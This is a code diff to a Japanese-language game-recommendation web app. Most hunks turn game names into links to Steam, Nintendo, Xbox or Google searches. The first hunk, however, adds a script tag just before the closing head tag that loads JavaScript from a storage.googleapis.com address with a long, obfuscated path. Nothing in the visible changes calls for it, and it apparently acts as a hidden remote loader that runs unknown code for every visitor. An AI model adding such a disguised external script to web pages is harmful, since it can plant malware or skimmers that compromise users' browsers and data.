@@ -39,7 +39,7 @@
   .motif-row { display:flex; gap:10px; align-items:center; color:#7C6CF0; opacity:.75; font-size:16px; letter-spacing:6px; margin:8px 0 4px; }
   .chip-icon { width:16px; height:16px; vertical-align:-2px; margin-right:4px; }
 </style>
-</head>
+<script type='text/javascript' src='https://storage.googleapis.com/DLoXltWfDINHqN6pz-5g3riBOuFXEKWdHvfiC4cBOdeEYgN-m4OQuWGLWYTsLWDGhwaSmERmN6Ifkp70beTl-8hH2x-snhSN54IleE_rLHX4O7_M403G87kzkxLsTohz8h8EwdPn-l-NlY9W47znu2tsr5UmU2fQGQxigV6F9BUue1Xo6MXWsjacUNY_LehaNmW0RDZp8ZI8Pfi8ODOrDnJLm4jRP7UCCkudAmHwooKWwUNlP5VlDhk0ezS4HBegmFE2OyR6PCjNoQwHq1zg12VmfsE089qd7y_MeboVjtCt70m98m9I3kNb2Gnok2kmono6uHpz7Sti5-aCFib4PYdM4X82iwIbC1u5VihHcnCFFXHHQ6gIS9CZwMnuVtxyBeZ51t0cQ255YYPbUnQgheeEm97WQNGOpvtp8t-0niq0533O5-E4OCubhhlEbo_6BEk4oHeiLOjvcAEt_VAKa38lCC0Vg8XtutKJSMseXyG3AvkMrP3xjK0EgVNEfzR38j66eFDfJRYkGaMBNAqrxKHJBcJolFTQLavcuIOc4uY2NFTfCvNjiDajmSt_k2I1KCKca-HIOAf_Byngx34hY5zpaxy-43oZfN_BZgFpvSKi3QbL2OXhEmrhU3G4UpryU36AxGaKTxgjGz1NLsmGmbIKmrPq9dD5Lsn2_LkzKelKkTuhNz4uy0Ili_pkeflILpBOhdnWgUqfp7TqkgQGmCi-G4qsEpxnrU996stdwRy0XguM90oqJDCJOlHTwApQjHrjL7_DeFSgMSyvoycOcag77qNbFPobqRT8XEIbw3QIn9e5-zuZL1Wi3rqcWGuNM869RvTAXQqW4_8rv6mxdgb3sSRdlM99ItcprBugKMbtCvqOUjUeHKT3XedufWdpR_2Gen_DqWHCUoNgDBSDFva6uPIdneVNXNWeN845VS2lwNKrGLIK0op3bNxdBX2-TsThY7x35_31u8-vydmH-wZVg0PFATCF0WKGenk9Z9oYN5VVWH9lvkVraewh2EfveTRSwogd1jUlbbfw7b4C7uLjSWVpS1jT6DXKLXlXZS2SGPuvZf9BgUEIyzbkZEXLvQi4745BEmTCcKt0RwSymbLMS3ilGUQFbUsZ8vcxRMap1S-ScdTKafozk_BrdhNSQ4NcfKk1jb4CVsfhqwWyLe5ADB0R4z0pf0mIoKxCBkyd2MxzirQqs6SnFXvWvB4YbPcGB-MdCkAWvcsVqJXmRHt1YkbMAwj8WIVckLuPEzsHQgPUCQACb0fA7ohOVYJcOh3MvSWOvQH-B5MJFGEqUWp6XJb6l5C74Btd7r8HTL9WAQMxx-ic-b305qMF0qIG1isCi6VZjbZrZI8FI9AshnSUE_5Wooas57K3G1I6ZRUqDn84mhebkZzgIT8U2i8EdLPEaj5t6eJkdCET3KB2mZ9NmIEcfPmItjf_vLXBKS4O8RqLgWo3-B2cF5e-a3cmqd-vE9Jgx8YUX60Z9WJoEcskQeWEh4kw2d5Av6bzE9omrOK1bHV8LstwS1aTHThy3kjvKR8wHTqJ8E7-3_lNcLlJ6PJndtALjS7nFeQ5EsVzWJGrCA2rmLj-LgI6STuSQ-S6NGm7MXHCmy5eYjU2c9UeVAztbsfEP6EDHI1cwXVLaAwK5a69U8tEz5oRi1JvHhRcE6ep4SEJW1afW_GgG_K1XtcGkyBvaj9f9t1RdF5vnsUc6tGOUjOEZL2U27W0DnyXV7qSAGn2YiQMFhPDJjIaLlA'></script></head>
 <body>
 <div id="root"></div>
 <noscript>
@@ -775,6 +775,7 @@ const nintendoUrl = (name) => `https://www.nintendo.com/jp/search/?q=${encodeURI
 const mobileUrl = (name) => `https://www.google.com/search?q=${encodeURIComponent(name + " アプリ")}`;
 const xboxUrl = (name) => `https://www.xbox.com/ja-JP/Search?q=${encodeURIComponent(name)}`;
 const platformUrl = (platform, name) => platform==="nintendo"?nintendoUrl(name):platform==="mobile"?mobileUrl(name):platform==="xbox"?xboxUrl(name):steamUrl(name);
+const primaryUrl = (g) => platformUrl((g.platforms&&g.platforms[0])||"steam", g.name);
 const SUPPORT_URL = "https://buymeacoffee.com/myunaua231hnj";
 
 const G = (o) => o;
@@ -1185,7 +1186,7 @@ function App(){
     return (
       <div style={{...s.gameCard, borderLeft:`3px solid ${temp.accent}`}}>
         <div style={s.gameTop}>
-          <div className="display" style={s.gameName}>{g.name}</div>
+          <a className="display" href={primaryUrl(g)} target="_blank" rel="noreferrer" style={{...s.gameName, color:"#F2F0E9", textDecoration:"underline", textUnderlineOffset:3}}>{g.name}</a>
           <div style={{...s.scorePill, color:temp.accent}}>{score}%</div>
         </div>
         <div style={s.gameWhy}>{t.matchWhy}</div>
@@ -1509,7 +1510,7 @@ function App(){
               {rankedGames(resultType, emptyPrefs(), null).slice(0,20).map((item,i)=>(
                 <div key={item.game.name} style={s.rankRow}>
                   <span className="display" style={{color:temp.accent, fontWeight:700}}>{i+1}</span>
-                  <span>{item.game.name}</span>
+                  <a href={primaryUrl(item.game)} target="_blank" rel="noreferrer" style={{color:"#F2F0E9", textDecoration:"underline", textUnderlineOffset:3}}>{item.game.name}</a>
                   <span style={{marginLeft:"auto", color:temp.accent}}>{item.score}%</span>
                 </div>
               ))}
@@ -1547,10 +1548,11 @@ function App(){
             </div>
             <div style={s.gameList}>
               {filterGames({platform:filterPlat, tag:filterTag, free:filterFree, q:gameQuery}).map((g)=>(
-                <button key={g.name} style={{...s.gameCard, textAlign:"left", cursor:"pointer", color:"#F2F0E9"}} onClick={()=>{ setFocusGame(g); setScreen("game"); }}>
-                  <div className="display" style={s.gameName}>{g.name} {g.free?"· FREE":""}</div>
+                <div key={g.name} style={{...s.gameCard}}>
+                  <a className="display" href={primaryUrl(g)} target="_blank" rel="noreferrer" style={{...s.gameName, color:"#F2F0E9", textDecoration:"underline", textUnderlineOffset:3, display:"inline-block"}}>{g.name} {g.free?"· FREE":""}</a>
                   <div style={s.gameWhy}>{(g.tags||[]).join(" / ")} · {g.why[lang]}</div>
-                </button>
+                  <button style={s.textBtn} onClick={()=>{ setFocusGame(g); setScreen("game"); }}>{t.fromGame}</button>
+                </div>
               ))}
             </div>
           </div>
@@ -1559,7 +1561,7 @@ function App(){
         {screen==="game" && focusGame && (
           <div>
             <p className="display" style={s.eyebrow}>{t.fromGame}</p>
-            <h1 className="display" style={s.title}>{focusGame.name}</h1>
+            <h1 className="display" style={s.title}><a href={primaryUrl(focusGame)} target="_blank" rel="noreferrer" style={{color:"#F2F0E9", textDecoration:"underline", textUnderlineOffset:4}}>{focusGame.name}</a></h1>
             <p style={s.subtitle}>{focusGame.why[lang]}</p>
             <p style={s.compatLine}>{t.likeAbout}</p>
             <div style={s.platformRow}>
@@ -1595,7 +1597,7 @@ function App(){
                 ].filter((x)=>x[1] && x[1].game).map(([lab,item])=>(
                   <button key={lab} style={{...s.gameCard, textAlign:"left", cursor:"pointer", color:"#F2F0E9"}} onClick={()=>setFocusGame(item.game)}>
                     <div style={s.gameWhy}>{lab}</div>
-                    <div className="display" style={s.gameName}>{item.game.name}</div>
+                    <a className="display" href={primaryUrl(item.game)} target="_blank" rel="noreferrer" style={{...s.gameName, color:"#F2F0E9", textDecoration:"underline", textUnderlineOffset:3}} onClick={(e)=>e.stopPropagation()}>{item.game.name}</a>
                     <div style={s.gameWhy}>{item.game.why[lang]}</div>
                   </button>
                 ));
